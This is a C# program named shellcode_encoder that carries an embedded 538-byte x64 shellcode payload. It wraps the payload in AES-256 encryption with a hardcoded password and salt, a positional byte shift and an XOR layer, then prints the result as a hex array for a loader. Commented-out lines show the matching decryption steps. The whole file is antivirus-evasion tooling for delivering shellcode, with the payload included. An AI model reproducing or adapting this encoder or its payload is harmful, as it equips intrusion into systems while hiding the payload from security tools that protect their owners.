using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Security.Cryptography;
using System.IO;

namespace shellcode_encoder
{
    class Program
    {
        static byte[] AESEncryptBytes(byte[] clearBytes, byte[] passBytes, byte[] saltBytes)
        {
            byte[] encryptedBytes = null;

            // create a key from the password and salt, use 32K iterations – see note
            var key = new Rfc2898DeriveBytes(passBytes, saltBytes, 32768);

            // create an AES object
            using (Aes aes = new AesManaged())
            {
                // set the key size to 256
                aes.KeySize = 256;
                aes.Key = key.GetBytes(aes.KeySize / 8);
                aes.IV = key.GetBytes(aes.BlockSize / 8);
                aes.Padding = PaddingMode.PKCS7;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        
                        cs.Write(clearBytes, 0, clearBytes.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }
            return encryptedBytes;
        }

        static byte[] AESDecryptBytes(byte[] cryptBytes, byte[] passBytes, byte[] saltBytes)
        {
            byte[] clearBytes = null;

            // create a key from the password and salt, use 32K iterations
            var key = new Rfc2898DeriveBytes(passBytes, saltBytes, 32768);

            using (Aes aes = new AesManaged())
            {
                // set the key size to 256
                aes.KeySize = 256;
                aes.Key = key.GetBytes(aes.KeySize / 8);
                aes.IV = key.GetBytes(aes.BlockSize / 8);
                aes.Padding = PaddingMode.PKCS7;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cryptBytes, 0, cryptBytes.Length);
                        cs.Close();
                    }
                    clearBytes = ms.ToArray();
                }
            }
            return clearBytes;
        }

        static void Main(string[] args)
        {
            
            byte[] buf = new byte[538] {
0x4d,0x31,0xc0,0x41,0xb0,0x3d,0x48,0xbd,0x46,0xdb,0xdb,0x5b,0xc8,0xf5,0x94,
0x26,0x48,0x89,0xe2,0x66,0x81,0xe2,0x70,0xf7,0xd9,0xd0,0x48,0x0f,0xae,0x02,
0x48,0x83,0xc2,0x08,0x4c,0x8b,0x1a,0x49,0xff,0xc8,0x4b,0x31,0x6c,0xc3,0x1a,
0x4d,0x85,0xc0,0x75,0xf3,0x0e,0xea,0x12,0x12,0x41,0x14,0xdd,0x9e,0xee,0x0f,
0x5a,0x7e,0x70,0xfa,0x55,0x7b,0x20,0x9a,0x5a,0xba,0xd8,0x00,0x4f,0xed,0xf7,
0xec,0x92,0x54,0x66,0xf4,0xdd,0xad,0x1f,0xd3,0x93,0xa4,0x01,0xb9,0xa5,0x62,
0x8d,0xc2,0x93,0xde,0x01,0x80,0x67,0xc3,0xa3,0xa5,0xb7,0x6a,0x22,0xee,0x1f,
0xe8,0xd3,0xdb,0x1b,0xd3,0x36,0x75,0x7e,0xbe,0xdb,0x55,0x50,0xa6,0xc7,0x7c,
0x77,0xda,0x43,0x51,0x52,0x6b,0x6f,0xca,0x8d,0xc3,0x19,0x17,0xf6,0xaa,0x38,
0xfb,0x82,0xbf,0xe6,0xa3,0xd5,0xae,0x42,0xcb,0xbc,0x7d,0x8e,0x02,0x13,0x02,
0x7e,0x55,0x51,0x4b,0x20,0xab,0x0c,0x94,0x9a,0xd4,0x8f,0x4f,0xdc,0xd3,0xfc,
0xcf,0x91,0x33,0xcb,0x8b,0x77,0xa1,0xbd,0x40,0xe1,0x9a,0x7f,0x41,0x88,0x83,
0xbc,0xb0,0x86,0xd6,0x06,0x8e,0x0f,0xaf,0xb8,0xca,0x86,0xe9,0xc4,0x06,0x63,
0x1a,0xa9,0x5d,0xdd,0x69,0xe6,0x3d,0xf8,0x9b,0x75,0x2e,0xf7,0xb2,0x2a,0xef,
0x26,0x9b,0xcd,0x1d,0x48,0xf0,0x83,0x40,0x72,0xd2,0x4e,0xec,0xd9,0xb0,0x0a,
0x47,0x90,0x58,0xe5,0x87,0x6e,0xf9,0x86,0x7e,0xa0,0x00,0xe0,0x87,0x14,0xe1,
0xbe,0xbc,0xe9,0xce,0xed,0x67,0x3b,0xf6,0x79,0x6b,0x15,0x86,0x2f,0xd2,0x8a,
0x4e,0xeb,0x3a,0x43,0xce,0x5f,0x51,0xae,0x56,0x32,0x39,0x75,0xce,0xe5,0xd1,
0xd3,0x56,0x32,0x39,0x35,0xce,0xe5,0xf1,0x9b,0x56,0xb6,0xdc,0x5f,0xcc,0x23,
0xb2,0x02,0x56,0x88,0xab,0xb9,0xba,0x0f,0xff,0xc9,0x32,0x99,0x2a,0xd4,0x4f,
0x63,0xc2,0xca,0xdf,0x5b,0x86,0x47,0xc7,0x3f,0xcb,0x40,0x4c,0x99,0xe0,0x57,
0xba,0x26,0x82,0x1b,0x95,0x39,0xe3,0x15,0x86,0x6e,0xcb,0x4e,0xde,0xcd,0x0c,
0x5d,0x87,0xbe,0xd3,0x40,0x56,0xa1,0x2f,0x9e,0xc6,0x4e,0xca,0xca,0xce,0x5a,
0x3d,0x5d,0x79,0xa7,0xc2,0x40,0x2a,0x31,0x23,0x14,0x50,0x23,0xb2,0x02,0x56,
0x88,0xab,0xb9,0xc7,0xaf,0x4a,0xc6,0x5f,0xb8,0xaa,0x2d,0x66,0x1b,0x72,0x87,
0x1d,0xf5,0x4f,0x1d,0xc3,0x57,0x52,0xbe,0xc6,0xe1,0x2f,0x9e,0xc6,0x4a,0xca,
0xca,0xce,0xdf,0x2a,0x9e,0x8a,0x26,0xc7,0x40,0x5e,0xa5,0x22,0x14,0x56,0x2f,
0x08,0xcf,0x96,0xf1,0x6a,0xc5,0xc7,0x36,0xc2,0x93,0x40,0xe0,0x31,0x54,0xde,
0x2f,0xda,0x8a,0x44,0xf1,0xe8,0xf9,0xa6,0x2f,0xd1,0x34,0xfe,0xe1,0x2a,0x4c,
0xdc,0x26,0x08,0xd9,0xf7,0xee,0x94,0xea,0x79,0x33,0xcb,0x71,0x1f,0xb9,0x6b,
0x15,0x86,0x6e,0x83,0xcb,0x56,0x34,0xe6,0x14,0x87,0x6e,0x83,0x8a,0xa4,0x88,
0xe0,0x7a,0x01,0x91,0x56,0x70,0xfe,0xa4,0x41,0x1f,0xc7,0xd4,0x25,0x5e,0xa3,
0x24,0x94,0xc0,0xce,0xed,0x47,0xe3,0x22,0xbf,0x17,0x1f,0x06,0x95,0x63,0xbe,
0x1b,0x02,0x2c,0x06,0xf4,0x01,0xe9,0xcb,0x47,0xf8,0xe2,0xcf,0x79,0xbb,0xe0,
0xaa,0x72,0xda,0x45,0x70,0xfe,0x0b,0x83,0xf4,0xaa,0x21,0x22,0xf8,0x60,0x6a,
0x7b,0x85,0x70,0x85,0x58,0xdd,0xc3,0xc9,0xa5,0x12,0x75,0x34,0xb6 };



            byte[] passBytes = Encoding.UTF8.GetBytes("This is the pass");
            byte[] saltBytes = Encoding.UTF8.GetBytes("This is the salt");
            byte[] aestest = AESEncryptBytes(buf, passBytes, saltBytes);


            //Caesar
            for (int i = 0; i < aestest.Length; i++)
            {
                aestest[i] = (byte)(((uint)aestest[i] + (i & 0xff)) & 0xff);
            }

            //XOR
            Int32 key = 93252512;
            for (int i = 0; i < aestest.Length; i++)
            {
                aestest[i] = (byte)(((uint)aestest[i] ^ (key + i)) & 0xFF);
            }

            byte[] result = aestest;
            ////XOR
            //Int32 key = 93252512;
            //for (int i = 0; i < startcode.Length; i++)
            //{
            //    startcode[i] = (byte)(((uint)startcode[i] ^ (key + i)) & 0xFF);
            //}


            //for (int i = 0; i < startcode.Length; i++)
            //{
            //    startcode[i] = (byte)(((uint)startcode[i] - (i & 0xFF)) & 0xFF);
            //}


            //byte[] passBytes = Encoding.UTF8.GetBytes("This is the pass");
            //byte[] saltBytes = Encoding.UTF8.GetBytes("This is the salt");
            //byte[] result = AESDecryptBytes(startcode, passBytes, saltBytes);


            StringBuilder hex = new StringBuilder(result.Length * 2);
            var each_line = 15;
            var total_length = 0;

            foreach (byte b in result)
            {
                hex.AppendFormat("0x{0:x2},", b);
                each_line = each_line - 1;
                total_length = total_length + 1;
                if (each_line == 0)
                {
                    hex.Append("\n");
                    each_line = 15;
                }

            }

            Console.WriteLine("The payload (" + total_length  + ") is:\n" + hex.ToString());
        }
    }
}
